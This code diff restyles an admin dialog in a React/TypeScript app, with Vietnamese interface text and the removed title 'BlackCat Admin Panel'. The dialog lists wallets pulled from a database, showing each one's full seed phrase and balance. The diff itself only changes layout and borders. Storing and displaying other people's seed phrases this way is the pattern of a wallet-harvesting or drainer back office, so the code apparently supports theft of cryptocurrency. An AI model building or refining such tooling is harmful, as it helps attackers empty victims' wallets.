@@ -55,10 +55,7 @@ export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
     <Dialog open={open} onOpenChange={onOpenChange}>
       <DialogContent className="sm:max-w-[900px] max-h-[80vh] overflow-y-auto">
         <DialogHeader>
-          <DialogTitle>BlackCat Admin Panel</DialogTitle>
-          <DialogDescription>
-            Hiển thị tất cả ví có trong database
-          </DialogDescription>
+          <DialogTitle>🐈‍⬛ Black Cat</DialogTitle>
         </DialogHeader>
 
         {loading && <div className="my-4 text-center">Đang tải dữ liệu...</div>}
@@ -76,28 +73,31 @@ export function AdminDialog({ open, onOpenChange }: AdminDialogProps) {
         )}
 
         {wallets.length > 0 && (
-          <div className="border border-gray-200 rounded-lg overflow-hidden">
+          <div className="border border-black rounded-lg overflow-hidden">
             <table className="w-full">
+              <colgroup>
+                <col style={{width: "70%"}} />
+                <col style={{width: "30%"}} />
+              </colgroup>
               <thead className="bg-gray-100">
                 <tr>
-                  <th className="px-4 py-3 border-b border-r text-left font-medium">Blockchain</th>
-                  <th className="px-4 py-3 border-b border-r text-left font-medium">Seed Phrase</th>
-                  <th className="px-4 py-3 border-b text-left font-medium">Số dư</th>
+                  <th className="px-4 py-3 border-b border-r border-black text-left font-medium">Seed Phrase</th>
+                  <th className="px-4 py-3 border-b border-black text-left font-medium">Số dư</th>
                 </tr>
               </thead>
               <tbody>
                 {wallets.map((wallet, index) => (
                   <tr key={`${wallet.blockchain}-${wallet.address}-${index}`} 
                       className={index % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
-                    <td className="px-4 py-3 border-b border-r">
-                      <span className="font-medium">{wallet.blockchain}</span>
-                    </td>
-                    <td className="px-4 py-3 border-b border-r">
+                    <td className="px-4 py-3 border-b border-r border-black">
                       <div className="font-mono text-sm" title={wallet.seedPhrase}>
                         {wallet.seedPhrase}
                       </div>
+                      <div className="text-xs text-gray-500 mt-1">
+                        {wallet.blockchain}
+                      </div>
                     </td>
-                    <td className="px-4 py-3 border-b text-right font-mono">
+                    <td className="px-4 py-3 border-b border-black text-right font-mono">
                       {wallet.balance}
                     </td>
                   </tr>
